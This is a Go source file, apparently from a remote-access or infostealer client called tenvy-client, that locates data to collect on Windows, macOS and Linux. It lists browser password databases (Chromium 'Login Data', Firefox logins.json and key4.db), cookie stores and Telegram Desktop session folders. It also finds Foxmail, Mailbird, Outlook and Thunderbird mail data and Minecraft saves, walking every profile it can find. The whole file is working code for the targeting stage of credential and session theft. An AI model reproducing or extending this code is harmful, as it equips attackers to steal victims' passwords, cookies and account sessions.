package recovery

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"

	"github.com/rootbay/tenvy-client/internal/protocol"
)

type resolvedSelection struct {
	selection protocol.RecoveryTargetSelection
	label     string
	paths     []string
}

func resolveSelections(selections []protocol.RecoveryTargetSelection) []resolvedSelection {
	resolved := make([]resolvedSelection, 0, len(selections))
	for idx, selection := range selections {
		label := sanitizeComponent(selection.Label)
		if label == "" {
			label = sanitizeComponent(defaultLabelFor(selection.Type))
		}
		if label == "" {
			label = sanitizeComponent(selection.Type)
		}
		if label == "" {
			label = sanitizeComponent(fmtLabelFromIndex(idx))
		}
		paths := filterExisting(resolveSelectionPaths(selection))
		resolved = append(resolved, resolvedSelection{
			selection: selection,
			label:     label,
			paths:     paths,
		})
	}
	return resolved
}

func defaultLabelFor(typ string) string {
	switch typ {
	case "chromium-history":
		return "chromium-history"
	case "chromium-bookmarks":
		return "chromium-bookmarks"
	case "chromium-cookies":
		return "chromium-cookies"
	case "chromium-passwords":
		return "chromium-passwords"
	case "gecko-history":
		return "gecko-history"
	case "gecko-bookmarks":
		return "gecko-bookmarks"
	case "gecko-cookies":
		return "gecko-cookies"
	case "gecko-passwords":
		return "gecko-passwords"
	case "minecraft-saves":
		return "minecraft-saves"
	case "minecraft-config":
		return "minecraft-config"
	case "telegram-session":
		return "telegram-session"
	case "foxmail-data":
		return "foxmail-data"
	case "mailbird-data":
		return "mailbird-data"
	case "outlook-data":
		return "outlook-data"
	case "thunderbird-data":
		return "thunderbird-data"
	default:
		return "target"
	}
}

func fmtLabelFromIndex(idx int) string {
	return fmt.Sprintf("target-%d", idx+1)
}

func resolveSelectionPaths(selection protocol.RecoveryTargetSelection) []string {
	switch selection.Type {
	case "chromium-history":
		return joinChromiumFile("History")
	case "chromium-bookmarks":
		return joinChromiumFile("Bookmarks")
	case "chromium-cookies":
		return joinChromiumFile("Cookies")
	case "chromium-passwords":
		return joinChromiumFile("Login Data")
	case "gecko-history":
		return joinGeckoPaths("places.sqlite")
	case "gecko-bookmarks":
		paths := joinGeckoPaths("places.sqlite", "bookmarkbackups")
		return paths
	case "gecko-cookies":
		return joinGeckoPaths("cookies.sqlite", "cookies.sqlite-wal", "cookies.sqlite-shm")
	case "gecko-passwords":
		return joinGeckoPaths("logins.json", "logins-backup.json", "key4.db", "key3.db", "signons.sqlite")
	case "minecraft-saves":
		return joinMinecraftPath("saves")
	case "minecraft-config":
		return joinMinecraftPath("config")
	case "telegram-session":
		return telegramSessionPaths()
	case "foxmail-data":
		return foxmailDataPaths()
	case "mailbird-data":
		return mailbirdDataPaths()
	case "outlook-data":
		return outlookDataPaths()
	case "thunderbird-data":
		return thunderbirdDataPaths()
	case "custom-path":
		paths := make([]string, 0, len(selection.Paths)+1)
		if strings.TrimSpace(selection.Path) != "" {
			paths = append(paths, selection.Path)
		}
		paths = append(paths, selection.Paths...)
		return paths
	default:
		if strings.TrimSpace(selection.Path) != "" {
			return []string{selection.Path}
		}
		return selection.Paths
	}
}

func filterExisting(paths []string) []string {
	seen := make(map[string]struct{})
	filtered := make([]string, 0, len(paths))
	for _, path := range paths {
		if strings.TrimSpace(path) == "" {
			continue
		}
		abs, err := filepath.Abs(path)
		if err != nil {
			continue
		}
		info, err := os.Stat(abs)
		if err != nil || (!info.Mode().IsRegular() && !info.IsDir()) {
			continue
		}
		if _, exists := seen[abs]; exists {
			continue
		}
		seen[abs] = struct{}{}
		filtered = append(filtered, abs)
	}
	sort.Strings(filtered)
	return filtered
}

func sanitizeComponent(value string) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return ""
	}
	replacements := []struct {
		from string
		to   string
	}{
		{"\\", "-"},
		{"/", "-"},
		{":", "-"},
		{"..", "-"},
		{" ", "-"},
	}
	for _, repl := range replacements {
		trimmed = strings.ReplaceAll(trimmed, repl.from, repl.to)
	}
	trimmed = strings.Trim(trimmed, "-._")
	if trimmed == "" {
		return ""
	}
	builder := strings.Builder{}
	for _, r := range trimmed {
		switch {
		case r >= 'a' && r <= 'z':
			builder.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			builder.WriteRune(r + ('a' - 'A'))
		case r >= '0' && r <= '9':
			builder.WriteRune(r)
		case r == '-' || r == '_' || r == '.':
			builder.WriteRune(r)
		default:
			builder.WriteRune('-')
		}
	}
	result := builder.String()
	result = strings.Trim(result, "-._")
	for strings.Contains(result, "--") {
		result = strings.ReplaceAll(result, "--", "-")
	}
	return result
}

func joinChromiumFile(name string) []string {
	dirs := chromiumProfileDirs()
	paths := make([]string, 0, len(dirs))
	for _, dir := range dirs {
		paths = append(paths, filepath.Join(dir, name))
	}
	return paths
}

func joinGeckoPaths(names ...string) []string {
	dirs := geckoProfileDirs()
	paths := make([]string, 0, len(dirs)*len(names))
	for _, dir := range dirs {
		for _, name := range names {
			if strings.TrimSpace(name) == "" {
				continue
			}
			paths = append(paths, filepath.Join(dir, name))
		}
	}
	return paths
}

func chromiumProfileDirs() []string {
	home, _ := os.UserHomeDir()
	dirs := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			dirs = append(dirs,
				filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default"),
				filepath.Join(localAppData, "Chromium", "User Data", "Default"),
				filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			dirs = append(dirs,
				filepath.Join(support, "Google", "Chrome", "Default"),
				filepath.Join(support, "Chromium", "Default"),
				filepath.Join(support, "BraveSoftware", "Brave-Browser", "Default"),
			)
		}
	default:
		if home != "" {
			dirs = append(dirs,
				filepath.Join(home, ".config", "google-chrome", "Default"),
				filepath.Join(home, ".config", "chromium", "Default"),
				filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser", "Default"),
			)
		}
	}
	return dirs
}

func joinMinecraftPath(child string) []string {
	roots := minecraftRoots()
	paths := make([]string, 0, len(roots))
	for _, root := range roots {
		paths = append(paths, filepath.Join(root, child))
	}
	return paths
}

func minecraftRoots() []string {
	home, _ := os.UserHomeDir()
	roots := []string{}
	switch runtime.GOOS {
	case "windows":
		if appData := os.Getenv("APPDATA"); appData != "" {
			roots = append(roots, filepath.Join(appData, ".minecraft"))
		}
		if home != "" {
			roots = append(roots, filepath.Join(home, "AppData", "Roaming", ".minecraft"))
		}
	case "darwin":
		if home != "" {
			roots = append(roots, filepath.Join(home, "Library", "Application Support", "minecraft"))
		}
	default:
		if home != "" {
			roots = append(roots, filepath.Join(home, ".minecraft"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			roots = append(roots, filepath.Join(dataHome, "minecraft"))
		}
	}
	return roots
}

func telegramSessionPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		if appData := os.Getenv("APPDATA"); appData != "" {
			paths = append(paths, filepath.Join(appData, "Telegram Desktop", "tdata"))
		}
		if home != "" {
			paths = append(paths, filepath.Join(home, "AppData", "Roaming", "Telegram Desktop", "tdata"))
		}
	case "darwin":
		if home != "" {
			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Telegram Desktop", "tdata"))
		}
	default:
		if home != "" {
			paths = append(paths, filepath.Join(home, ".local", "share", "TelegramDesktop", "tdata"))
		}
	}
	return paths
}

func foxmailDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, "Foxmail"),
				filepath.Join(appData, "Foxmail7"),
			)
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "Foxmail"),
				filepath.Join(localAppData, "Foxmail7"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".foxmail"),
				filepath.Join(home, "Foxmail"),
			)
		}
	}
	return paths
}

func mailbirdDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "Mailbird"),
				filepath.Join(localAppData, "Mailbird", "Store"),
			)
		}
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "Mailbird"))
		}
	}
	return paths
}

func outlookDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "Microsoft", "Outlook"),
				filepath.Join(localAppData, "Microsoft", "Outlook", "RoamCache"),
			)
		}
		documents := os.Getenv("USERPROFILE")
		if documents == "" {
			documents = home
		}
		if documents != "" {
			paths = append(paths,
				filepath.Join(documents, "Documents", "Outlook Files"),
				filepath.Join(documents, "Documents", "My Outlook Data File"),
			)
		}
	case "darwin":
		if home != "" {
			group := filepath.Join(home, "Library", "Group Containers", "UBF8T346G9.Office", "Outlook")
			paths = append(paths,
				group,
				filepath.Join(group, "Outlook 15 Profiles"),
			)
		}
	default:
		if home != "" {
			paths = append(paths, filepath.Join(home, ".local", "share", "evolution", "mail"))
		}
	}
	return paths
}

func thunderbirdDataPaths() []string {
	roots := thunderbirdRoots()
	return collectProfileDirs(roots, true)
}

func geckoProfileDirs() []string {
	roots := geckoRoots()
	return collectProfileDirs(roots, false)
}

func collectProfileDirs(roots []string, includeRootFallback bool) []string {
	seen := make(map[string]struct{})
	dirs := []string{}
	add := func(path string) {
		trimmed := strings.TrimSpace(path)
		if trimmed == "" {
			return
		}
		candidate := filepath.Clean(trimmed)
		if !filepath.IsAbs(candidate) {
			if abs, err := filepath.Abs(candidate); err == nil {
				candidate = abs
			}
		}
		info, err := os.Stat(candidate)
		if err != nil || !info.IsDir() {
			return
		}
		if _, exists := seen[candidate]; exists {
			return
		}
		seen[candidate] = struct{}{}
		dirs = append(dirs, candidate)
	}

	for _, root := range roots {
		root = strings.TrimSpace(root)
		if root == "" {
			continue
		}
		cleaned := filepath.Clean(root)
		if entries := parseGeckoProfilesINI(cleaned, filepath.Join(cleaned, "profiles.ini")); len(entries) > 0 {
			for _, entry := range entries {
				add(entry)
			}
		}
		profileDir := filepath.Join(cleaned, "Profiles")
		appendProfileDirs(profileDir, add, nil)
		if includeRootFallback {
			appendProfileDirs(cleaned, add, func(name string) bool {
				lower := strings.ToLower(name)
				if strings.Contains(lower, "default") || strings.Contains(lower, "profile") {
					return true
				}
				return strings.Contains(name, ".") || strings.Contains(name, "-")
			})
		} else {
			appendProfileDirs(cleaned, add, func(name string) bool {
				lower := strings.ToLower(name)
				if strings.Contains(lower, "default") || strings.Contains(lower, "release") {
					return true
				}
				if strings.Contains(lower, "profile") {
					return true
				}
				return strings.Contains(name, ".") || strings.Contains(name, "-")
			})
		}
	}

	sort.Strings(dirs)
	return dirs
}

func appendProfileDirs(dir string, add func(string), filter func(string) bool) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()
		if filter != nil && !filter(name) {
			continue
		}
		add(filepath.Join(dir, name))
	}
}

func parseGeckoProfilesINI(root, iniPath string) []string {
	file, err := os.Open(iniPath)
	if err != nil {
		return nil
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	current := make(map[string]string)
	profiles := []map[string]string{}
	flush := func() {
		if len(current) == 0 {
			return
		}
		entry := make(map[string]string, len(current))
		for k, v := range current {
			entry[k] = v
		}
		profiles = append(profiles, entry)
		current = make(map[string]string)
	}

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, ";") {
			continue
		}
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			flush()
			continue
		}
		if idx := strings.Index(line, "="); idx >= 0 {
			key := strings.TrimSpace(line[:idx])
			value := strings.TrimSpace(line[idx+1:])
			if key != "" {
				current[strings.ToLower(key)] = value
			}
		}
	}
	flush()

	dirs := []string{}
	for _, profile := range profiles {
		pathValue := strings.TrimSpace(profile["path"])
		if pathValue == "" {
			continue
		}
		candidate := filepath.FromSlash(pathValue)
		if profile["isrelative"] != "0" {
			candidate = filepath.Join(root, candidate)
		}
		dirs = append(dirs, candidate)
	}
	return dirs
}

func geckoRoots() []string {
	home, _ := os.UserHomeDir()
	roots := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			roots = append(roots,
				filepath.Join(appData, "Mozilla", "Firefox"),
				filepath.Join(appData, "Waterfox"),
				filepath.Join(appData, "LibreWolf"),
			)
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			roots = append(roots,
				filepath.Join(localAppData, "Mozilla", "Firefox"),
				filepath.Join(localAppData, "Waterfox"),
				filepath.Join(localAppData, "LibreWolf"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			roots = append(roots,
				filepath.Join(support, "Firefox"),
				filepath.Join(support, "Waterfox"),
				filepath.Join(support, "LibreWolf"),
			)
		}
	default:
		if home != "" {
			roots = append(roots,
				filepath.Join(home, ".mozilla", "firefox"),
				filepath.Join(home, ".waterfox"),
				filepath.Join(home, ".librewolf"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			roots = append(roots,
				filepath.Join(config, "firefox"),
				filepath.Join(config, "waterfox"),
				filepath.Join(config, "librewolf"),
			)
		}
	}
	return roots
}

func thunderbirdRoots() []string {
	home, _ := os.UserHomeDir()
	roots := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			roots = append(roots, filepath.Join(appData, "Thunderbird"))
		}
	case "darwin":
		if home != "" {
			roots = append(roots, filepath.Join(home, "Library", "Thunderbird"))
		}
	default:
		if home != "" {
			roots = append(roots,
				filepath.Join(home, ".thunderbird"),
				filepath.Join(home, ".mozilla", "thunderbird"),
			)
		}
	}
	return roots
}
